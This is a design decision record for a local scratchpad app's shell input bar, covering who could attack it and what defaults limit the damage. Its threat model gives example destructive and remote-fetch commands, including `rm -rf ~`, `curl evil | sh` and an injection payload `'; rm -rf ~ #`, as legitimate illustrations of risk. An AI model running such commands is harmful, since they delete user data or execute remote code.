---
id: decision-2
title: Threat model and safety defaults for the shell input bar
date: '2026-05-24 09:11'
status: accepted
---

## Context

The shell input bar (TASK-9, the M4 differentiator) executes arbitrary shell
commands typed by the user, with the most-recent dump piped to the command's
stdin. Two things make this worth thinking about carefully:

1. Scratchpad receives dumps from any local process that can reach
   `127.0.0.1:8473`. That includes the user's own scripts but also any other
   process running as the user.
2. The shell command itself is *typed by the user*, but the input bytes the
   command processes can come from anywhere on the loopback interface.

This document captures the threat model and the safety defaults the
implementation must enforce.

## Threat model

### Who is the attacker?

Three relevant actors, in roughly decreasing trust:

1. **The user.** They type commands. They are the primary "attacker" in the
   sense that destructive shell commands (`rm -rf ~`, `curl evil | sh`) will
   succeed if typed. We do not — and cannot — protect a user from their own
   shell.
2. **Local processes running as the user.** Anything able to POST to the
   loopback port can send dumps. They cannot, however, execute commands; that
   path goes through the keyboard, which they don't have. The worst they can
   do is send a payload that the user might later run a destructive command
   over (e.g. send a list of "files to delete" and hope the user pipes
   through `xargs rm`).
3. **Remote attackers.** Out of scope. The HTTP listener is loopback-bound
   (defense-in-depth check on the remote endpoint) so a network attacker
   cannot deliver a dump in the first place.

### What's at risk?

- The user's filesystem (commands can read/write/delete anywhere the user can).
- Network egress (commands can `curl` data out).
- CPU/memory (a runaway command can hang the UI thread or eat resources).

### Key design property

**The dump is delivered to the shell as stdin, never interpolated into the
command string.** That means a malicious dump cannot escape into shell syntax.
A payload of `'; rm -rf ~ #` is harmless unless the user *types* a command
that reads it back and re-executes it (which is, again, the user's choice).

This is why we don't escape, sanitize, or constrain the payload contents:
they're data, not code. The command is code, and the user typed it.

## Decision

The shell runner executes commands with these defaults, all enforced in the
implementation (`ShellRunner`):

| Default | Value | Rationale |
|---|---|---|
| Shell | `/bin/sh -c <command>` | Universal, present on every macOS. Avoids the user's interactive shell rc files. |
| Working directory | `$HOME` | Matches what a fresh terminal would have. Predictable. |
| Environment | Inherits process environment | Same env as the Scratchpad app. No special elevation. |
| stdin | The most-recent dump bytes | Closed after writing so commands like `cat` terminate. |
| Timeout | **10 seconds** | Bounds runaway commands; configurable via `SCRATCHPAD_SHELL_TIMEOUT`. |
| Output cap | **4 MiB** stdout + 4 MiB stderr | Prevents OOM from `find /` etc.; truncates with a marker. |
| Cancellation | Pressing the cancel button or running another command kills the previous one | UI must stay responsive. |

What we deliberately do NOT do:
- We don't restrict commands by name or block "dangerous" ones. That would be
  security theatre and break legitimate use.
- We don't sandbox the subprocess (no `sandbox-exec`, no temporary user). The
  user is already root over their own files; pretending otherwise is misleading.
- We don't ask for confirmation. Friction here would destroy the feature's
  value as an exploratory tool.

## Consequences

- The shell input bar is appropriate for **dev tooling on a single-user
  machine**. It is not appropriate for shared environments (kiosk, CI, etc.).
  v1 ships with the assumption of single-user dev use.
- A 10-second timeout occasionally bites long-running commands (large `jq`
  on big files). The env var escape hatch is enough until usage tells us
  otherwise.
- Buffer caps mean very large output gets truncated. The truncation marker
  must say so plainly so the user doesn't trust an incomplete result.

## Follow-ups

- Document the threat model in user-facing docs alongside the per-language
  examples (TASK-15) so users understand what they're opting into.
- Revisit if/when we add a global hotkey or background dump-pipelining
  features that don't require a focused user.
